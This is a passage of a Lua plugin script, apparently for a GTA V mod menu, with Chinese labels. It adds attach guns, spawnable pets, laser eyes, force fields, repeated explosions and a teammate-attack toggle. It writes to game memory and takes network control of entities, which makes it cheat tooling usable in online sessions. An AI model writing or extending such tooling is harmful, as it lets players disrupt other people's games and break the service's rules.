menu.slider(attachGun, "X 旋转", {"attachGunrotx"}, "", -360, 360, 0, 10, function (value) attach_gun.rx = value end); menu.slider(attachGun, "Y 旋转", {"attachGunroty"}, "", -360, 360, 0, 10, function (value) attach_gun.ry = value end); menu.slider(attachGun, "Z 旋转", {"attachGunrotz"}, "", -360, 360, 0, 10, function (value) attach_gun.rz = value end)
menu.toggle(attachGun, "软连接", {"attachGunsoftpinning"}, "如果设置为关闭,则固定时附加实体不会分离.", function (toggle) attach_gun.softPinning = toggle end)
menu.toggle(attachGun, "碰撞", {"attachGuncollision"}, "控制两个实体之间的碰撞. 设置关闭则是禁用碰撞.", function (toggle) attach_gun.collision = toggle end)
menu.slider(attachGun, "顶点位置", {"attachGunvertex"}, "仅限高级用户!顶点位置.", -100000, 100000, 0, 1, function (value) attach_gun.vertexIndex = value end)
menu.toggle(attachGun, "固定旋转", {"attachGunfixedrot"}, "如果为关闭，则忽略实体向量.", function (toggle) attach_gun.fixedRot = toggle end, true)


p_AttachGun = menu.list(editGuns, "附加枪 (物理)", {}, "Attach gun that uses ATTACH_ENTITY_TO_ENTITY_PHYSICALLY, making entites have collision with each other.")
p_attach_gun = {
    e1 = 0, e2 = 0,
    bone1 = 0, bone2 = 0,
    px1 = 0, py1 = 0, pz1 = 0,
    px2 = 0, py2 = 0, pz2 = 0,
    rx = 0, ry = 0, rz = 0,
    breakforce = 200, fixedRot = true,
    collision = true, dontTPToBone = true,
}
menu.divider(p_AttachGun, "------")
menu.toggle_loop(p_AttachGun, "开启", {"pattachgun"}, "以物理方式将实体连接到实体(无ped).", function ()
    if p_attach_gun.e1 == 0 then util.draw_debug_text("移动1") elseif p_attach_gun.e2 == 0 then util.draw_debug_text("移动2") end
    if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
        if PAD.IS_CONTROL_JUST_PRESSED(0, 54) then -- 54 || INPUT_WEAPON_SPECIAL_TWO || E
            local entpointer = memory.alloc()
            util.toast("分配.")
            if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), entpointer) then
                local handle = memory.read_int(entpointer)
                if ENTITY.IS_ENTITY_A_PED(handle) then handle = PED.GET_VEHICLE_PED_IS_IN(handle, false) end
                if p_attach_gun.e1 == 0 then
                    p_attach_gun.e1 = handle
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(handle)
                elseif p_attach_gun.e2 == 0 then
                    if p_attach_gun.e1 == handle then util.toast("不能有相同的实体!") else
                        p_attach_gun.e2 = handle
                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(handle)
                        ---- --- -- ---
                        util.toast("附加完成!")
                        --(​Entity entity1, Entity entity2, int boneIndex1, int boneIndex2, float xPos1, float yPos1, float zPos1, float xPos2, float yPos2, float zPos2,
                        -- float xRot, float yRot, float zRot, float breakForce, BOOL fixedRot, BOOL p15, BOOL collision, BOOL p17, int p18)
                        ENTITY.ATTACH_ENTITY_TO_ENTITY_PHYSICALLY(p_attach_gun.e1, p_attach_gun.e2,
                        p_attach_gun.bone1, p_attach_gun.bone2,
                        p_attach_gun.px1, p_attach_gun.py1, p_attach_gun.pz1, p_attach_gun.px2, p_attach_gun.py2, p_attach_gun.pz2,
                        p_attach_gun.rx, p_attach_gun.ry, p_attach_gun.rz,
                        p_attach_gun.breakforce, p_attach_gun.fixedRot, true, p_attach_gun.collision, p_attach_gun.dontTPToBone, 2)
                        --clear edit gun memory
                        p_attach_gun.e1 = 0
                        p_attach_gun.e2 = 0
                    end
                end
            end
            util.toast("释放.")
            memory.free(entpointer)
        end
    end
end)
menu.divider(p_AttachGun, "设置")
menu.slider(p_AttachGun, "骨骼位置 1", {"pattachbone1"}, "仅限高级用户!", -100000, 100000, 0, 1, function (value) p_attach_gun.bone1 = value end) menu.slider(p_AttachGun, "骨骼位置 2", {"pattachbone2"}, "仅限高级用户!", -100000, 100000, 0, 1, function (value) p_attach_gun.bone2 = value end)
menu.slider(p_AttachGun, "X 偏移 1", {"pattachx1"}, "X 偏移: 实体 1", -100000, 100000, 0, 100, function (value) p_attach_gun.px1 = value/100 end) menu.slider(p_AttachGun, "Y 偏移 1", {"pattachy1"}, "Y 偏移: 实体 1", -100000, 100000, 0, 100, function (value) p_attach_gun.py1 = value/100 end) menu.slider(p_AttachGun, "Z 偏移 1", {"pattachz1"}, "Z 偏移: 实体 1", -100000, 100000, 0, 100, function (value) p_attach_gun.pz1 = value/100 end)
menu.slider(p_AttachGun, "X 偏移 2", {"pattachx2"}, "X 偏移: 实体 2", -100000, 100000, 0, 100, function (value) p_attach_gun.px2 = value/100 end) menu.slider(p_AttachGun, "Y 偏移 2", {"pattachy2"}, "Y 偏移: 实体 2", -100000, 100000, 0, 100, function (value) p_attach_gun.py2 = value/100 end) menu.slider(p_AttachGun, "Z 偏移 2", {"pattachz2"}, "Z 偏移: 实体 2", -100000, 100000, 0, 100, function (value) p_attach_gun.pz2 = value/100 end)
menu.slider(p_AttachGun, "X 旋转", {"pattachxrot"}, "", -360, 360, 0, 10, function (value) p_attach_gun.rx = value end) menu.slider(p_AttachGun, "Y 旋转", {"pattachyrot"}, "", -360, 360, 0, 10, function (value) p_attach_gun.ry = value end) menu.slider(p_AttachGun, "Z 旋转", {"pattachzrot"}, "", -360, 360, 0, 10, function (value) p_attach_gun.rz = value end)
menu.slider(p_AttachGun, "断裂力", {"pattachbreakforce"}, "打破这种结合所需的力量.", 0, 100000, 200, 100, function (value) p_attach_gun.breakforce = value end)
menu.toggle(p_AttachGun, "固定旋转", {"pattachfixedrot"}, "如果为关闭，则忽略实体向量.", function (toggle) p_attach_gun.fixedRot = toggle end, true)
menu.toggle(p_AttachGun, "碰撞", {"pattachcollision"}, "控制两个实体之间的碰撞. 设置关闭则是禁用碰撞.", function (toggle) p_attach_gun.collision = toggle end, true)
menu.toggle(p_AttachGun, "不传送到骨骼位置", {"pattachdonttptobone"}, "不要将实体传送到目标实体骨骼索引的位置.", function (toggle) p_attach_gun.dontTPToBone = toggle end, true)

local snow_loca = menu.list(helperingame, "雪人位置", {}, "")
for idx, coords in snowmens do
    snow_loca:action("雪人 " .. idx, {}, "传送到圣诞雪人", function()
        util.teleport_2d(coords[1], coords[2])
    end)
end

util.keep_running()

watch_dog = menu.list(helperingame, "看门狗2.0", {}, "", function(); end)
Dog = menu.action(watch_dog, "加载看门狗2.0", {""}, "看门狗2.0", function()

    notification("正在加载看门狗2.0,请稍等")
    menu.delete(Dog)
util.yield(3000)

dofile(filesystem.scripts_dir().."\\lib\\GTlib\\Dog2.0.lua")

end)

local myroot = menu.list(helperingame, "宠物选项", {}, "", function(); end)
local allpetsroot = menu.list(myroot, "所有宠物", {}, "")
local activepet = menu.list(myroot, "管理宠物", {}, "这些是你生成的宠物")

        menu.toggle(allpetsroot, "无敌", {}, "给你所有宠物无敌", function(on)
            if on then
                for k,v in pairs(activedogs) do
                    ENTITY.SET_ENTITY_INVINCIBLE(v, true)
                end
            else
                for k,v in pairs(activedogs) do
                    ENTITY.SET_ENTITY_INVINCIBLE(v, false)
                end
            end
        end)

        menu.action(allpetsroot, "删除所有宠物", {}, "", function()
            for k,v in pairs(activedogs) do
                entities.delete_by_handle(v)
            end
        end)
       
menu.action_slider(myroot, "生成一只宠物", {}, "生成一个忠诚的同伴,它将跟随并保护你.", dogs, function(opt, breeds)
    local hash = util.joaat("A_C_" .. breeds)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, math.random(1,4), 0)
    if getgroupsize(mygroup) >= 7 then
        notification("你已超过宠物的最大数量.")
    else
        local dog_ped = entities.create_ped(26, hash, coords, 0)
        activedogs[#activedogs+1] = dog_ped
        PED.SET_PED_AS_GROUP_MEMBER(dog_ped, mygroup)
        PED.SET_PED_AS_GROUP_MEMBER(dog_ped, mygroup)
        PED.SET_PED_NEVER_LEAVES_GROUP(dog_ped, true)
        PED.SET_GROUP_SEPARATION_RANGE(mygroup, 99999)

        local thispet = menu.list(activepet, breeds, {}, "")



        menu.text_input(thispet, "设置名字", {"setname"}, "", function(name)
            GenerateNametagOnPed(dog_ped, name)
        end)

        menu.toggle(thispet, "无敌", {}, "", function(on)
            if on then
                ENTITY.SET_ENTITY_INVINCIBLE(dog_ped, true)
            else
                ENTITY.SET_ENTITY_INVINCIBLE(dog_ped, false)
            end
        end)



        if breeds ~= "Cat_01" then

            menu.toggle(thispet, "坐下", {}, "让您的宠物坐下.", function(on)
                if on then
                    if breeds == "Rottweiler" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[1], 0, true)
                    elseif breeds == "Retriever" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[2], 0, true)
                    elseif breeds == "Shepherd" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[3], 0, true)
                    elseif breeds == "Husky" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[3], 0, true)
                    else
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[4], 0, true)

                    end
                else
                    TASK.CLEAR_PED_TASKS(dog_ped)
                end
            end)



            menu.action(thispet, "汪汪", {}, "汪汪汪!", function()
                if breeds == "Rottweiler" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_ROTWEILER", 0, true)
                elseif breeds == "Retriever" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_RETRIEVER", 0, true)
                elseif breeds == "Shepherd" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SHEPHERD", 0, true)
                elseif breeds == "Husky" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SHEPHERD", 0, true)
                else
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SMALL", 0, true)
                end
                util.yield(5000)
                TASK.CLEAR_PED_TASKS(dog_ped)
            end)
        end



        if breeds == "Cat_01" then 
            menu.toggle(thispet, "躺下放松", {}, "", function(on)
                if on then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_CAT_SLEEPING_GROUND", 0, true)
                else
                    TASK.CLEAR_PED_TASKS(dog_ped)
                end
            end)
        end


        menu.action(thispet, "删除宠物", {}, "和平中撕扯, 我毛茸茸的朋友", function()
            entities.delete_by_handle(dog_ped)
            menu.delete(thispet)
        end)
    end
end)

clpid = {}
menu.action(funfeatures_self, "克隆自己", {}, "生成克隆的你", function()
    clpid [#clpid + 1] = PED.CLONE_PED(players.user_ped(), true, true, true) --spawns clone
end)

menu.toggle(funfeatures_self, "另类人", {}, "", function(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("amb@world_human_sit_ups@male@base") do 
        STREAMING.REQUEST_ANIM_DICT("amb@world_human_sit_ups@male@base")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    guitar = OBJECT.CREATE_OBJECT(util.joaat(""), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "amb@world_human_sit_ups@male@base", "base", 10, 3, -1, 51, 5, false, false, false) --play anim 
    ENTITY.ATTACH_ENTITY_TO_ENTITY(guitar, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 24818), 0.52,0.43,-0.16,0.2,70,340, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(guitar)
    end
end)

menu.toggle(funfeatures_self, "螺旋丸", {}, "", function(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("anim@mp_player_intincarfreakoutstd@ps@") do 
        STREAMING.REQUEST_ANIM_DICT("anim@mp_player_intincarfreakoutstd@ps@")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    guitar = OBJECT.CREATE_OBJECT(util.joaat("prop_bowling_ball"), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "anim@mp_player_intincarfreakoutstd@ps@", "idle_a_fp", 10, 3, -1, 51, 5, false, false, false) --play anim 
    ENTITY.ATTACH_ENTITY_TO_ENTITY(guitar, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 24818), 0.30,0.53,0,0.2,70,340, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(guitar)
    end
end)

local startViewMode
local scope_scaleform
local gaveHelmet = false
menu.toggle_loop(funfeatures_self, '钢铁侠', {'JSironman'}, '', function()
    if not menu.get_value(levitationCommand) then
        menu.trigger_command(levitationCommand)
    end
    if not PED.IS_PED_WEARING_HELMET(players.user_ped()) then
        PED.GIVE_PED_HELMET(players.user_ped(), true, 4096, -1)
        gaveHelmet = true
    end
    local context = CAM._GET_CAM_ACTIVE_VIEW_MODE_CONTEXT()
    if startViewMode == nil then
        startViewMode = CAM.GET_CAM_VIEW_MODE_FOR_CONTEXT(context)
    end
    if CAM.GET_CAM_VIEW_MODE_FOR_CONTEXT(context) != 4 then
        CAM.SET_CAM_VIEW_MODE_FOR_CONTEXT(context, 4)
    end
    scope_scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE('REMOTE_SNIPER_HUD')
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scope_scaleform, 'REMOTE_SNIPER_HUD')
    GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scope_scaleform, 255, 255, 255, 255, 0)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    local barrageInput = 'INPUT_PICKUP'
    if not PAD._IS_USING_KEYBOARD(0) then
        barrageInput = 'INPUT_COVER'
    end
    memory.write_int(memory.script_global(1649593 + 1163), 1)
    SFasd.CLEAR_ALL()
    SFasd.TOGGLE_MOUSE_BUTTONS(false)
    SFasd.SET_DATA_SLOT(2, JSkey.get_control_instructional_button(0, 'INPUT_ATTACK'), '爆炸')
    SFasd.SET_DATA_SLOT(1, JSkey.get_control_instructional_button(0, 'INPUT_AIM'), '光束')
    SFasd.SET_DATA_SLOT(0, JSkey.get_control_instructional_button(0, barrageInput), '弹幕')
    SFasd.DRAW_INSTRUCTIONAL_BUTTONS()
    JSkey.disable_control_action(2, 'INPUT_VEH_MOUSE_CONTROL_OVERRIDE')
    JSkey.disable_control_action(2, 'INPUT_VEH_FLY_MOUSE_CONTROL_OVERRIDE')
    JSkey.disable_control_action(2, 'INPUT_VEH_SUB_MOUSE_CONTROL_OVERRIDE')
    JSkey.disable_control_action(0, 'INPUT_ATTACK')
    JSkey.disable_control_action(0, 'INPUT_AIM')
    if not (JSkey.is_disabled_control_pressed(0, 'INPUT_ATTACK') or JSkey.is_disabled_control_pressed(0, 'INPUT_AIM') or JSkey.is_disabled_control_pressed(0, barrageInput)) then return end
    local a = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local b = getOffsetFromCam(80)
    local hash
    if JSkey.is_disabled_control_pressed(0, 'INPUT_ATTACK') then
        hash = util.joaat('VEHICLE_WEAPON_PLAYER_LAZER')
        if not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) then
            WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 26)
            while not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) do
                util.yield()
            end
        end
    elseif JSkey.is_disabled_control_pressed(0, 'INPUT_AIM') then
        hash = util.joaat('WEAPON_RAYPISTOL')
        if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), hash, false) then
            WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 9999, false, false)
        end
    else
        hash = util.joaat('WEAPON_RPG')
        if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), hash, false) then
            WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 9999, false, false)
        end
        a.x += math.random(0, 100) / 100
        a.y += math.random(0, 100) / 100
        a.z += math.random(0, 100) / 100
    end
    WEAPON.SET_CURRENT_PED_WEAPON(players.user_ped(), util.joaat('WEAPON_UNARMED'), true)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
        a.x, a.y, a.z,
        b.x, b.y, b.z,
        200,
        true,
        hash,
        PLAYER.PLAYER_PED_ID(),
        true, true, -1.0
    )
end, function()
    if gaveHelmet then
        PED.REMOVE_PED_HELMET(players.user_ped(), true)
        gaveHelmet = false
    end
    HUD._HUD_WEAPON_WHEEL_IGNORE_CONTROL_INPUT(false)
    local pScaleform = memory.alloc_int()
    memory.write_int(pScaleform, scope_scaleform)
    GRAPHICS.SET_SCALEFORM_MOVIE_AS_NO_LONGER_NEEDED(pScaleform)
    menu.trigger_command(levitationCommand, 'off')
    util.yield()
    CAM.SET_CAM_VIEW_MODE_FOR_CONTEXT(CAM._GET_CAM_ACTIVE_VIEW_MODE_CONTEXT(), startViewMode)
    startViewMode = nil
end)

menu.toggle_loop(funfeatures_self, '起飞', {}, '按住空格', function ()
    if PAD.IS_CONTROL_PRESSED(0, 22) then
        PED.SET_PED_CAN_RAGDOLL(players.user_ped(), false)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(players.user_ped(), 1, 0.5, 0.5, 0.5, 0, 0, 0, 0, true, true, true, true)
    end
end)

menu.action(funfeatures_self, '翻跟斗', {}, '前空翻', function ()
    local hash = util.joaat("prop_ecola_can")
    request_model_load(hash)
    local prop = entities.create_object(hash, players.get_position(players.user()))
    ENTITY.FREEZE_ENTITY_POSITION(prop)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), prop, 0, 0, 0, 0, 0, 0, 0, true, false, false, false, 0, true)
    local hdg = CAM.GET_GAMEPLAY_CAM_ROT(0).z
    ENTITY.SET_ENTITY_ROTATION(prop, 0, 0, hdg, 1)
    for i=1, -360, -16 do
        ENTITY.SET_ENTITY_ROTATION(prop, i, 0, hdg, 1)
        util.yield()
    end
    ENTITY.DETACH_ENTITY(players.user_ped())
    entities.delete_by_handle(prop)
end)

tpf_units = 1
menu.action(funfeatures_self, '瞬间移动', {}, '', function(on_click)
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, tpf_units, 0)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos['x'], pos['y'], pos['z'], true, false, false)
end)

menu.slider(funfeatures_self, '瞬移范围', {}, '', 1, 100, 1, 1, function(s)
    tpf_units = s
end)

s_forcefield_range = 20
s_forcefield = 0
s_forcefield_names = {
    [0] = "推开",
    [1] = "弹飞",
    [2] = "拉近"
}

menu.toggle_loop(funfeatures_self, "力场", {"sforcefield"}, "", function()
    if players.exists(players.user()) then
        local _entities = {}
        local player_pos = players.get_position(players.user())

        for _, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if v3.distance(player_pos, vehicle_pos) <= s_forcefield_range then
                table.insert(_entities, vehicle)
            end
        end
        for _, ped in pairs(entities.get_all_peds_as_handles()) do
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if (v3.distance(player_pos, ped_pos) <= s_forcefield_range) and not PED.IS_PED_A_PLAYER(ped) then
                table.insert(_entities, ped)
            end
        end
        for _, entity in pairs(_entities) do
            local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
            local entity_type = ENTITY.GET_ENTITY_TYPE(entity)

            if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and player_vehicle ~= entity then
                if entity_type == 1 then
                    PED.SET_PED_TO_RAGDOLL(entity, 500, 0, 0, false, false, false)
                end
                if s_forcefield == 1 then
                    ENTITY.APPLY_FORCE_TO_ENTITY(
                        entity, 3, 0, 0, 1, 0, 0, 0.5, 0, false, false, true, false, false
                    )
                else
                    local force = ENTITY.GET_ENTITY_COORDS(entity)
                    v3.sub(force, player_pos)
                    v3.normalise(force)

                    if s_forcefield == 2 then
                        v3.mul(force, -1)
                    end

                    ENTITY.APPLY_FORCE_TO_ENTITY(
                        entity, 3, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true, false, false
                    )
                end
            end
        end
    end
end)

s_forcefield_direction_slider = menu.slider_text(
    funfeatures_self, "力场方向", {"sforcefieldirection"}, "", s_forcefield_names, function()end
)
util.create_tick_handler(function()
    if not players.exists(players.user()) then
        return false
    end

    s_forcefield = menu.get_value(s_forcefield_direction_slider)
end)

s_forcefield_range_slider = menu.slider_float(
    funfeatures_self, "力场范围", {"sforcefieldrange"}, "", 100, 10000, 2000, 10, function(value)
        s_forcefield_range = value/100
end)

menu.action(funfeatures_self,"生成多米诺骨牌", {"spawndominoes"}, "很无聊的功能", function()
    local hash = util.joaat("prop_boogieboard_01")
    request_model_load(hash)
    local last_ent = players.user_ped()
    for i=2, 25 do 
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(last_ent, 0, -i, 0)
        local d = entities.create_object(hash, c)
        ENTITY.SET_ENTITY_HEADING(d, ENTITY.GET_ENTITY_HEADING(last_ent))
        OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(d)
    end
end)

menu.action(funfeatures_self, '一键获得雪球', {}, '获得雪球！', function ()
    yijianxueqiu()
end)
    
menu.action(funfeatures_self, '一键获得烟花发射器', {}, '获得烟花发射器', function ()
    yijianyanhua()
end)
    jigaungyan = menu.list(funfeatures_self, "激光眼", {}, "", function(); end)
menu.toggle_loop(jigaungyan, "激光眼V1", {"lasereyes"}, "按E键", function(on)
    laser_eyes()
end)


        local hash <const> = util.joaat("VEHICLE_WEAPON_PLAYER_LAZER")
        local showNotification = true
        local lastShot = newTimer()
        local sound = Sound.new("Fire_Loop", "DLC_IE_VV_Gun_Player_Sounds")


        local DisableControlActions = function()
            PAD.DISABLE_CONTROL_ACTION(0, 106, true)
            PAD.DISABLE_CONTROL_ACTION(0, 122, true)
            PAD.DISABLE_CONTROL_ACTION(0, 135, true)
            PAD.DISABLE_CONTROL_ACTION(0, 140, true)
            PAD.DISABLE_CONTROL_ACTION(0, 141, true)
            PAD.DISABLE_CONTROL_ACTION(0, 142, true)
            PAD.DISABLE_CONTROL_ACTION(0, 263, true)
            PAD.DISABLE_CONTROL_ACTION(0, 264, true)
        end

        menu.toggle_loop(jigaungyan, "激光眼V2", {"combustionman"}, "按E键", function()
        
            HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
            DisableControlActions()
            if not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) then
                WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 26)
            end
        
            if not PAD.IS_DISABLED_CONTROL_PRESSED(51, 51) then
                if not sound:hasFinished() then
                    sound:stop()
                end
            elseif lastShot.elapsed() > 100 then
                local pos = PED.GET_PED_BONE_COORDS(players.user_ped(), 0x322C, 0.0, 0.0, 0.0)
                local offset = get_offset_from_cam(80)
                if  sound:hasFinished() then
                    sound:playFromEntity(players.user_ped())
                    AUDIO.SET_VARIABLE_ON_SOUND(sound.Id, "fireRate", 10.0)
                end
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
                    pos.x, pos.y, pos.z,
                    offset.x, offset.y, offset.z,
                    200,
                    true,
                    hash, players.user_ped(), true, true, -1.0
                )
                lastShot.reset()
            end
        end, function()
            if not sound:hasFinished() then
                sound:stop()
            end
        end)

menu.toggle(funfeatures_self, "疯狗模式", {""}, "按e使用激光眼", function(on)
    if on then

    menu.trigger_commands("trails")
    menu.trigger_commands("trailcolourrainbow")
    menu.trigger_commands("lasereyes")
    menu.trigger_commands("bodylight")
    menu.trigger_commands("forcefield")
    menu.trigger_commands("jedimode")
    menu.trigger_commands("screenvisual")
    menu.trigger_commands("bighammer")
    menu.trigger_commands("wring")
    menu.trigger_commands("JSfireWings")
    else
    menu.trigger_commands("trails")
    menu.trigger_commands("trailcolourrainbow")
    menu.trigger_commands("lasereyes")
    menu.trigger_commands("bodylight")
    menu.trigger_commands("forcefield")
    menu.trigger_commands("jedimode")
    menu.trigger_commands("screenvisual")
    menu.trigger_commands("bighammer")
    menu.trigger_commands("wring")
    menu.trigger_commands("JSfireWings")
    end
end)

menu.toggle_loop(funfeatures_self, "爆炸圈", {""}, "形成包围圈", function(on)
    baozhanquan()
end)

    menu.toggle(funfeatures_self, "超级跑", {"Super Run"}, "", function(on)

        if on then
        Super = on
        menu.trigger_commands("walkspeed 1.5")
        menu.trigger_commands("gracefullanding on")
        menu.trigger_commands("superrun 1.2")
        else
        menu.trigger_commands("walkspeed 1")
        menu.trigger_commands("gracefullanding off")
        menu.trigger_commands("superrun 0")
        Super = off
        end
    end,false)

menu.toggle(funfeatures_self, "忍者跑",{""}, "忍者跑步动作",function(on)
    renzhepao(on)
end)

menu.toggle(funfeatures_self, "痛击队友", {}, "对队友展开攻击", function(toggle)
    PED.SET_CAN_ATTACK_FRIENDLY(players.user_ped(), toggle, false) 
end)

menu.toggle_loop(funfeatures_self, "快速近战", {"fastmelee"}, "近战速度更快.", function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 130) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)

menu.toggle_loop(funfeatures_self, "快速攀爬", {"fastmount"}, "更快的攀爬一些东西\n例如：汽车、障碍物等.", function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 50) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 51) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)

menu.toggle_loop(funfeatures_self, "鸡巴炮", {"用鸡巴发射炮弹"}, "", function ()
    local ptfx_asset = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_trailburst"
    diaoshepao(ptfx_asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, players.user_ped(), 0.0, 0.0, -0.3, 90.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0)
    for i=1, 10 do 
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, i, 0.0)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 67, 0.0, false, false, 0.0, true)
    end
end)

menu.toggle_loop(funfeatures_self, "鸡巴炮v2", {"用鸡巴发射炮弹"}, "", function ()
    local ptfx_asset = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_trail_spawn"
    diaoshepao(ptfx_asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, players.user_ped(), 0.0, 0.0, -0.3, 90.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0)
    for i=1, 10 do 
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, i, 0.0)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 67, 0.0, false, false, 0.0, true)
    end
end)

    menu.toggle(funfeatures_self, "兔子模式", {"spawnrabbit"}, "注意:掏出枪瞄准时会引发崩溃(XA)", function(on)
        if on then
            menu.trigger_commands("ACRabbit02")
            menu.trigger_commands("walkstyle mop")
            notification("兔子模式启动") 
        else
            restore_model()
        end
    end)

    menu.toggle(funfeatures_self, "圣诞怪兽模式", {"spawnyulemonster"}, "", function(on)
        if on then
            menu.trigger_commands("UMMYuleMonster")
            menu.trigger_commands("walkstyle mop")
            notification("圣诞怪兽模式启动") 
        else
            restore_model()
        end
    end)

    menu.toggle(funfeatures_self, "动物模式", {"spawnfurry"}, "", function(on)
        if on then
            menu.trigger_commands("IGFurry")
            menu.trigger_commands("walkstyle mop")
            notification("动物模式启动") 
        else
            restore_model()
        end
    end)

    menu.toggle(funfeatures_self, "投降(按x)",{""}, "",function(state)
        handsup = state
        while handsup do
            hhandup()
            util.yield()
        end
    end)
